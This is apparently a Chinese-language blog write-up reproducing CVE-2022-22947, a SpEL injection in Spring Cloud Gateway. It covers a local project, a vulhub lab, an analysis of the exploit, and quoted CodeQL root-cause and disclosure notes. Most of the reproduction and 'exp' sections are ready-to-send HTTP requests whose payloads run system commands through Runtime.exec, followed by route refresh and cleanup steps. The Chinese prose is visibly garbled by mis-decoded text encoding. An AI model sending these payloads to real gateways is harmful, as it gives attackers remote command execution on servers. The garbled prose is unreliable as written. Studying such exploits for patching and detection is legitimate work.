<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">org<span class="hljs-regexp">/springframework/</span>cloud<span class="hljs-regexp">/gateway/</span>filter<span class="hljs-regexp">/factory/</span>RewritePathGatewayFilterFactory.java<br></code></pre></td></tr></table></figure>

<p>æ‰¾åˆ° RewritePathGatewayFilterFactory ä¸­å®ç°äº†  ShortcutConfigurable  ï¼Œé‚£å°±å¯ä»¥é€šè¿‡  actuator ä¼ å…¥ RewritePath çš„å‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šè¿›å…¥ getValue() æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œ</p>
<h2 id="2-2-å¤ç°"><a href="#2-2-å¤ç°" class="headerlink" title="2.2 å¤ç°"></a>2.2 å¤ç°</h2><h3 id="2-2-1-æœ¬åœ°é¡¹ç›®æ­å»º"><a href="#2-2-1-æœ¬åœ°é¡¹ç›®æ­å»º" class="headerlink" title="2.2.1 æœ¬åœ°é¡¹ç›®æ­å»º"></a>2.2.1 æœ¬åœ°é¡¹ç›®æ­å»º</h3><p>æ¶æ„ HTTP requests:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;) == null ? &#x27;/bypass&#x27; : &#x27;/executed&#x27;&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058154.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åˆ·æ–°è·¯ç”±ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: 127.0.0.1:9000<br>Content-Type: application/json<br>Connection: close<br>Content-Length: 258<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054749.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹è·¯ç”±ï¼Œå·²ç»å†™å…¥äº†æ–°çš„è·¯ç”±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054579.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>è®¿é—®è·¯ç”±ï¼Œè™½ç„¶æ˜¯ 404 ï¼Œä½†è¿™é‡Œå®é™…ä¸Šæ˜¯<code>https://xvshifu.github.io/</code>çš„404é¡µé¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /new_route/ HTTP/1.1<br>Host: localhost:9000<br>Connection: close<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058696.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054296.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æœ€åæ¸…ç†ä¸€ä¸‹åˆ›å»ºçš„è·¯ç”±å§ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058706.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054112.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h3 id="2-2-2-ä½¿ç”¨-docker-é¡¹ç›®å¤ç°"><a href="#2-2-2-ä½¿ç”¨-docker-é¡¹ç›®å¤ç°" class="headerlink" title="2.2.2 ä½¿ç”¨ docker é¡¹ç›®å¤ç°"></a>2.2.2 ä½¿ç”¨ docker é¡¹ç›®å¤ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone --depth 1 https://github.com/vulhub/vulhub.git<br>cd vulhub/spring/CVE-2022-22947<br>docker compose up -d<br>http://your-ip:8080<br></code></pre></td></tr></table></figure>



<p>å¯åŠ¨ç¯å¢ƒï¼š<code>docker compose up -d</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272105292.png" srcset="/img/loading.gif" lazyload></p>
<p>è®¿é—®ï¼š<a target="_blank" rel="noopener" href="http://192.168.31.16:8080/">http://192.168.31.16:8080/</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054136.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>é¦–å…ˆå‘é€æ•°æ®åŒ…æ·»åŠ ä¸€ä¸ªåŒ…å«æ¶æ„ SpEL è¡¨è¾¾å¼çš„è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/hacktest HTTP/1.1<br>Host: 192.168.31.16:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close <br>Content-Type: application/json <br>Content-Length: 0<br><br>&#123;<br>  &quot;id&quot;: &quot;hacktest&quot;,<br>  &quot;filters&quot;: [&#123;<br>    &quot;name&quot;: &quot;AddResponseHeader&quot;,<br>    &quot;args&quot;: &#123;<br>      &quot;name&quot;: &quot;Result&quot;,<br>      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;<br>    &#125;<br>  &#125;],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272058909.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ç„¶åè¿›è¡Œåˆ·æ–°è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.16:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close <br>Content-Type: application/json <br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054655.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±ç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /actuator/gateway/routes/hacktest HTTP/1.1<br>Host: 192.168.31.16:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close <br>Content-Type: application/json <br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054249.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>æ¸…ç†ç°åœºï¼Œåˆ é™¤è·¯ç”±ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">DELETE /actuator/gateway/routes/hacktest HTTP/1.1<br>Host: 192.168.31.16:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close <br>Content-Type: application/json <br>Content-Length: 0<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272059085.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/refresh HTTP/1.1<br>Host: 192.168.31.16:8080<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close <br>Content-Type: application/json <br>Content-Length: 0<br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054032.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054698.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="2-3-åˆ†æ-exp"><a href="#2-3-åˆ†æ-exp" class="headerlink" title="2.3 åˆ†æ exp:"></a>2.3 åˆ†æ exp:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>      # SpEL è¡¨è¾¾å¼æ³¨å…¥ï¼Œé€šè¿‡åå°„è°ƒç”¨ Java Runtime æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;) == null ? &#x27;/bypass&#x27; : &#x27;/executed&#x27;&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>é€šè¿‡é…ç½®è·¯ç”±å°†æœªè¢«è¿‡æ»¤çš„ SpEL è¡¨è¾¾å¼æ³¨å…¥åˆ°è·¯ç”±ä¸­ï¼Œå½“ç½‘å…³æ‰§è¡Œåˆ·æ–°è·¯ç”±é…ç½®æ—¶ï¼ŒSpEL è¡¨è¾¾å¼è¢«è‡ªåŠ¨è§£ææ‰§è¡Œã€‚</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&#x27;calc.exe&#x27;</span>) == <span class="hljs-literal">null</span> ? <span class="hljs-string">&#x27;/bypass&#x27;</span> : <span class="hljs-string">&#x27;/executed&#x27;</span>&#125;</span>&quot;</span>,<br></code></pre></td></tr></table></figure>

<p>-&gt;</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">String <span class="hljs-keyword">result</span> <span class="hljs-operator">=</span> T(java.lang.Runtime).getRuntime().<span class="hljs-keyword">exec</span>(<span class="hljs-string">&#x27;calc.exe&#x27;</span>) <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">null</span> ? <span class="hljs-string">&#x27;/bypass&#x27;</span> : <span class="hljs-string">&#x27;/executed&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>å¦‚æœ<code>exec()</code>æˆåŠŸï¼Œè¿”å›ä¸€ä¸ª<code>Process</code>å¯¹è±¡ï¼Œä¸æ˜¯<code>null</code>ï¼Œè¡¨è¾¾å¼æœ€ç»ˆè¿”å›å­—ç¬¦ä¸²<code>&quot;/executed&quot;</code>ï¼›</p>
<p>å¦‚æœå¤±è´¥ï¼ˆä¸€èˆ¬ä¸ä¼šå¤±è´¥ï¼‰ï¼Œè¿”å›<code>&quot;/bypass&quot;</code>ï¼›ä¹Ÿå°±æ˜¯è¯´ SpEL è¿”å›å€¼å§‹ç»ˆæ˜¯æœ‰æ•ˆçš„å­—ç¬¦ä¸²è·¯å¾„ã€‚</p>
<p> Spring Cloud Gateway è¦æ±‚ <code>RewritePath</code> çš„ç¬¬1ä¸ªå‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ­£åˆ™ï¼  </p>
<p>è€ŒåŸä½œè€…çš„ exp æ˜¯è¿™æ ·å†™çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: 127.0.0.1:9000<br>Connection: close<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(\&quot;touch /tmp/x\&quot;)&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://wya.pl&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br>&quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(\&quot;touch /tmp/x\&quot;)&#125;&quot;,<br>exec()` è¿”å›çš„æ˜¯ï¼š`java.lang.Process å¯¹è±¡<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥æ— æ³•æ·»åŠ åˆ°è·¯ç”±ã€‚</p>
<p>å½“æˆ‘ä»¬æ”¹ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(\&quot;calc.exe\&quot;)&#125;&quot;,<br></code></pre></td></tr></table></figure>

<p>åœ¨åˆ·æ–°è·¯ç”±æ—¶ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œä½†ä»ç„¶ä¸ä¼šæ·»åŠ åˆ°æ–°è·¯ç”±ã€‚</p>
<p>è¿™æ˜¯å› ä¸º SpEL è¡¨è¾¾å¼åœ¨ååºåˆ—åŒ–è·¯ç”±æ—¶å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä¸ç®¡æœ€ç»ˆæ˜¯å¦èƒ½åˆ›å»ºæˆåŠŸ  </p>
<p>é‚£ä¹ˆåŸä½œè€…ä¸ºä»€ä¹ˆè¦ä½¿ç”¨<strong>ä¸ä¼šåˆ›å»ºè·¯ç”±</strong>çš„ exp å‘¢ï¼Ÿ</p>
<p>çœŸç›¸æ˜¯ï¼šåŸä½œè€…ä½¿ç”¨çš„ Spring Cloud Gateway ç‰ˆæœ¬ä¸­<strong>æ²¡æœ‰ä¸¥æ ¼æ ¡éªŒ RewritePath çš„å‚æ•°ç±»å‹</strong></p>
<h2 id="2-4-exp"><a href="#2-4-exp" class="headerlink" title="2.4 exp:"></a>2.4 exp:</h2><p> æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p>Windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /actuator/gateway/routes/new_route HTTP/1.1<br>Host: localhost:9000<br>Content-Type: application/json<br><br>&#123;<br>  &quot;predicates&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;Path&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;filters&quot;: [<br>    &#123;<br>      &quot;name&quot;: &quot;RewritePath&quot;,<br>      &quot;args&quot;: &#123;<br>        &quot;_genkey_0&quot;: &quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;) == null ? &#x27;/bypass&#x27; : &#x27;/executed&#x27;&#125;&quot;,<br>        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;<br>      &#125;<br>    &#125;<br>  ],<br>  &quot;uri&quot;: &quot;https://xvshifu.github.io/&quot;,<br>  &quot;order&quot;: 0<br>&#125;<br>&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cmd /c whoami&#x27;) != null ? &#x27;/ok&#x27; : &#x27;/err&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure>



<p>Linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">#åˆ›å»ºæ–‡ä»¶<br>&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;touch /tmp/pwn&#x27;) != null ? &#x27;/ok&#x27; : &#x27;/err&#x27;&#125;&quot;<br>#æ‰§è¡Œå‘½ä»¤<br>&quot;#&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;) != null ? &#x27;/ok&#x27; : &#x27;/err&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure>



<h2 id="2-5-æ·±å…¥æŒ–æ˜"><a href="#2-5-æ·±å…¥æŒ–æ˜" class="headerlink" title="2.5 æ·±å…¥æŒ–æ˜"></a>2.5 æ·±å…¥æŒ–æ˜</h2><p>ä½œè€…ç”¨ CodeQL å†æ¬¡éªŒè¯ Spring Cloud Gateway CVE-2022-22947 çš„æ ¹å›  ã€‚</p>
<blockquote>
<p>From here, I drafted up some CodeQL to see if I could track this behavior. It turns out the default CodeQL queries miss the Mono library as a source, so the SpEL injection can never be reached as a sink.</p>
<p>Above is what can be seen when running the default SpelInjectionConfig isSource predicate. Some sources can be seen, but none of these flow towards a valid SpEL sink.</p>
</blockquote>
<p>è¿™ä¸ªæ¼æ´çš„è§¦å‘ç‚¹åœ¨ Spring Cloud Gateway ä¸­æ˜¯ Mono(reactive æµå¼å¯¹è±¡)ï¼Œé»˜è®¤ CodeQL åªè®¤ä¼ ç»Ÿ Spring MVC ä¸­çš„è¾“å…¥æºï¼ˆæ¯”å¦‚ HttpServletRequestï¼‰ï¼Œæ‰€ä»¥ CodeQL ä¸çŸ¥é“ Mono é‡Œçš„ç”¨æˆ·è¾“å…¥ä¹Ÿæ˜¯å±é™©çš„ï¼Œå› æ­¤å®ƒè®¤ä¸ºæ²¡æœ‰å±é™©è¾“å…¥æºæµå…¥ SpEL ï¼Œä¸ä¼šæŠ¥é”™ã€‚</p>
<p>æ€»ä¹‹ï¼Œé»˜è®¤çš„ CodeQL æ£€æµ‹ä¸å‡ºæ­¤æ¼æ´ã€‚</p>
<blockquote>
<p>I ended up including <a target="_blank" rel="noopener" href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/deadcode/SpringEntryPoints.qll/type.SpringEntryPoints$SpringManagedResource.html">SpringManagedResource</a> in the default unsafe SpEL query to add in additional sources, which essentially checks for annotated <code>@RequestBody</code> and <code>@RequestParam</code> methods.<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272059951.png" srcset="/img/loading.gif" lazyload alt="img"></p>
</blockquote>
<p>åæ¥ä½œè€…å†™è‡ªå®šä¹‰çš„ CodeQL è§„åˆ™æ—¶ï¼Œå‘ç°é»˜è®¤çš„ CodeQL æ£€æµ‹ä¸åˆ°</p>
<ul>
<li>Spring WebFlux ä¸­çš„ Mono<T></li>
<li>@RequestBody JSON è¾“å…¥</li>
<li>@RequestParam å‚æ•°</li>
</ul>
<p> è¿™äº›éƒ½å±äºâ€œç”¨æˆ·è¾“å…¥æ¥æºâ€ï¼ˆsourcesï¼‰ï¼Œä½†æ˜¯é»˜è®¤ CodeQL ä¸è®¤è¯† ã€‚æ‰€ä»¥ä½œè€…æŠŠ CodeQL çš„ Source æ‰©å±•ä¸ºï¼š**ä»»ä½•å¸¦ @RequestBodyã€@RequestParam çš„å­—æ®µ&#x2F;Controller å…¥å‚ï¼Œéƒ½ç®—å±é™©è¾“å…¥æ¥æºã€‚**è¿™æ · CodeQL å°±èƒ½è¿½è¸ªä» HTTP â†’ SpEL çš„æ•°æ®æµã€‚</p>
<blockquote>
<p>From there it was a basic path-problem of letting CodeQL determine if any input from an HTTP request could reach the StandardEvaluationContext in ShortcutConfigurable.<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272054432.png" srcset="/img/loading.gif" lazyload alt="img">The outputs from the SpelInjectionQuery werenâ€™t the easiest to understand, but some results are better than no results. I couldnâ€™t figure out how to manually trace the code from the paths that CodeQL had provided. However, when I used a debugger and triggered a payload I could then step through a very similar chain to what CodeQL displayed.</p>
<p>I sent this over to VMware, who currently manages the security for Pivotal (Spring) products, on 1&#x2F;15&#x2F;22. They let me know they received my report pretty quickly after. Approximately a month later on 2&#x2F;8&#x2F;22 I heard back. They had created their own class that mostly implemented the SimpleEvaluationContext.</p>
</blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯ï¼ŒCodeQL æ£€æŸ¥è¾“å…¥æ˜¯å¦èƒ½å¤Ÿåˆ°è¾¾ <code>ShortcutConfigurable</code> ä¸­çš„  <code>StandardEvaluationContext</code>ï¼ˆ<code>StandardEvaluationContext</code>æ˜¯æ‰§è¡Œ SpEL è¡¨è¾¾å¼çš„åœ°æ–¹ï¼Œä¹Ÿæ˜¯ RCE çš„æ ¹æœ¬ç‚¹ï¼‰ã€‚æ‰€ä»¥ CodeQL åªéœ€åˆ¤æ–­ï¼šHTTP è¾“å…¥ï¼ˆå¦‚ JSONï¼‰æ˜¯å¦èƒ½åˆ°è¾¾ SpEL æ‰§è¡Œç¯å¢ƒï¼Œå¦‚æœèƒ½åˆ°è¾¾ï¼Œå°±è¯´æ˜å­˜åœ¨ SpEL æ³¨å…¥ï¼ˆRCEï¼‰ã€‚</p>
<p>è¿è¡Œ CodeQL åçš„è¾“å‡ºï¼Œèƒ½å¤Ÿè¯´æ˜æ¼æ´çš„ç¡®å­˜åœ¨ã€‚ ä½œè€…ç”¨ CodeQL æ‰©å±•è§„åˆ™è¯†åˆ« <code>@RequestBody </code>è¾“å…¥ï¼Œå¹¶æˆåŠŸè¯æ˜ HTTP JSON è¾“å…¥ç¡®å®èƒ½æµå…¥ SpEL æ‰§è¡Œç‚¹ã€‚ç„¶åæŠŠæ¼æ´æŠ¥å‘Šç»™ VMwareï¼Œåè€…é€šè¿‡é™åˆ¶ <code>EvaluationContext</code> ä¿®å¤äº† RCEã€‚  </p>
<h2 id="2-6-æœ‰äººæŠŠè±†å­æ”¾è¿›ç”µè„‘é‡Œ"><a href="#2-6-æœ‰äººæŠŠè±†å­æ”¾è¿›ç”µè„‘é‡Œ" class="headerlink" title="2.6 æœ‰äººæŠŠè±†å­æ”¾è¿›ç”µè„‘é‡Œ ^-"></a>2.6 æœ‰äººæŠŠè±†å­æ”¾è¿›ç”µè„‘é‡Œ ^-</h2><p> Spring çš„ bean å±…ç„¶èƒ½è¢« SpEL è®¿é—®äº†ï¼åƒæœ‰äººæŠŠ bean å¡è¿›ç”µè„‘é‡Œä¸€æ ·ã€‚  </p>
<blockquote>
<h2 id="â€œSomeone-Put-Beans-Inside-the-Computerâ€"><a href="#â€œSomeone-Put-Beans-Inside-the-Computerâ€" class="headerlink" title="â€œSomeone Put Beans Inside the Computerâ€"></a>â€œSomeone Put Beans Inside the Computerâ€</h2><p>The SimpleEvaluationContext supports a subset of SpEL features and is generally safer than StandardEvaluationContext. The <a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html">Javadocs</a> state â€œ<code>SimpleEvaluationContext</code> is tailored to support only a subset of the SpEL language syntax, e.g. excluding references to Java types, constructors, and bean references.â€</p>
<p>While I was looking into this I saw the original need for SpEL come from some issues on the GitHub repo. Primarily users were looking to implement a custom bean that could be invoked via a SpEL expression. An example was to manage the rate limit on a route.</p>
</blockquote>
